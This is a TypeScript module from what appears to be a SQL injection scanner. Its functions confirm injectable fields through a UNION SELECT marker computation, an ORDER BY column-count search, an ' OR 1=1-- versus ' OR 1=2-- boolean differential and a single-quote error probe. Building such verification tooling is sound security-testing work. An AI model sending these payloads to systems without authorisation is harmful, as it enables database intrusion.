import { httpRequest } from '../tools/http';
import { fingerprintDb } from '../recon/fingerprint';
import type { Finding, OracleEvidence } from './types';


export interface InjectionContext {
    prefix: string;   // breaks out of the current syntax AND makes the original match no rows
    comment: string;  // ends the statement: "-- " or "#"
}

const DEFAULT_CTX: InjectionContext = { prefix: "'", comment: '-- ' };

function randMarker(): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let s = '';
    for (let i = 0; i < 6; i++) s += chars[Math.floor(Math.random() * chars.length)];
    return s;
}

async function send(finding: Finding, value: string) {
    const params = { ...(finding.otherFields ?? {}), [finding.field]: value };
    return finding.method === 'GET'
        ? httpRequest({ method: 'GET', path: finding.path, query: params })
        : httpRequest({ method: 'POST', path: finding.path, form: params });
}

function snippet(body: string, needle: string): string {
    const i = body.indexOf(needle);
    return i < 0 ? body.slice(0, 80) : body.slice(Math.max(0, i - 20), i + needle.length + 20);
}

function isSqlError(res: { status: number }): boolean {
    return res.status >= 500;
}

async function findColumnCountByOrderBy(finding: Finding, ctx: InjectionContext): Promise<number | null> {
    const first = await send(finding, `${ctx.prefix} ORDER BY 1${ctx.comment}`);
    if (isSqlError(first)) return null;

    let low = 1, bound = 0;
    for (let probe = 2; probe <= 256; probe *= 2) {
        const res = await send(finding, `${ctx.prefix} ORDER BY ${probe}${ctx.comment}`);
        if (isSqlError(res)) { bound = probe; break; }
        low = probe;
    }
    if (bound === 0) return null;

    let high = bound;
    while (high - low > 1) {
        const mid = Math.floor((low + high) / 2);
        const res = await send(finding, `${ctx.prefix} ORDER BY ${mid}${ctx.comment}`);
        if (isSqlError(res)) high = mid; else low = mid;
    }
    return low;
}

// Now takes an InjectionContext (defaults to string context, so existing callers
// are unchanged). Deep-mode calls it with a non-string context (e.g. numeric).
export async function computationalOracle(finding: Finding, ctx: InjectionContext = DEFAULT_CTX): Promise<OracleEvidence> {
    const marker = randMarker();
    const a = 100 + Math.floor(Math.random() * 900);
    const b = 100 + Math.floor(Math.random() * 900);
    const expected = `${marker}${a * b}`;
    const expr = `'${marker}'||(${a}*${b})`;

    const guessed = await findColumnCountByOrderBy(finding, ctx);
    const candidates: number[] = [];
    if (guessed) candidates.push(guessed);
    for (let c = 1; c <= 8; c++) if (!candidates.includes(c)) candidates.push(c);

    for (const cols of candidates) {
        const injected = `${ctx.prefix} UNION SELECT ${Array(cols).fill(expr).join(',')}${ctx.comment}`;
        const res = await send(finding, injected);
        if (res.body.includes(expected)) {
            return {
                oracle: 'computational', passed: true, request: injected, expected,
                actualSnippet: snippet(res.body, expected),
                detail: `DB computed ${a}*${b} and echoed our marker (cols=${cols}, prefix="${ctx.prefix}").`,
            };
        }
    }
    return {
        oracle: 'computational', passed: false,
        request: `UNION marker ${expected} (prefix="${ctx.prefix}")`,
        expected,
        actualSnippet: guessed ? `(not reflected; ORDER BY suggested ${guessed} cols)` : '(marker never reflected)',
    };
}

// Oracle 2 — BOOLEAN DIFFERENTIAL. TRUE vs FALSE must differ predictably vs a
// baseline. The differential is what resists false positives.
export async function booleanOracle(finding: Finding): Promise<OracleEvidence> {
    const base = await send(finding, 'zzz_benign_zzz');
    const t = await send(finding, `' OR 1=1-- `);
    const f = await send(finding, `' OR 1=2-- `);
    const tSig = `${t.status}:${t.body.length}`;
    const fSig = `${f.status}:${f.body.length}`;
    const differ = tSig !== fSig;
    return {
        oracle: 'boolean', passed: differ,
        request: `TRUE(' OR 1=1-- ) vs FALSE(' OR 1=2-- )`,
        actualSnippet: `baseline=${base.status}:${base.body.length} TRUE=${tSig} FALSE=${fSig}`,
        detail: differ ? 'TRUE and FALSE differ predictably.' : 'No differential — not boolean-injectable here.',
    };
}

// Oracle 3 — ERROR SIGNAL (weak). A leaked DB error means injectable-LOOKING,
// but is not proof of exploitation on its own.
export async function errorSignal(finding: Finding): Promise<OracleEvidence> {
    const res = await send(finding, `'`);
    const fp = fingerprintDb(res.body);
    const passed = fp.engine !== 'unknown';
    return {
        oracle: 'error', passed,
        request: `single quote '`,
        actualSnippet: passed ? `${fp.engine}: "${fp.evidence}"` : '(no DB error leaked)',
        detail: passed ? `Leaked ${fp.engine} error.` : 'No error leaked.',
    };
}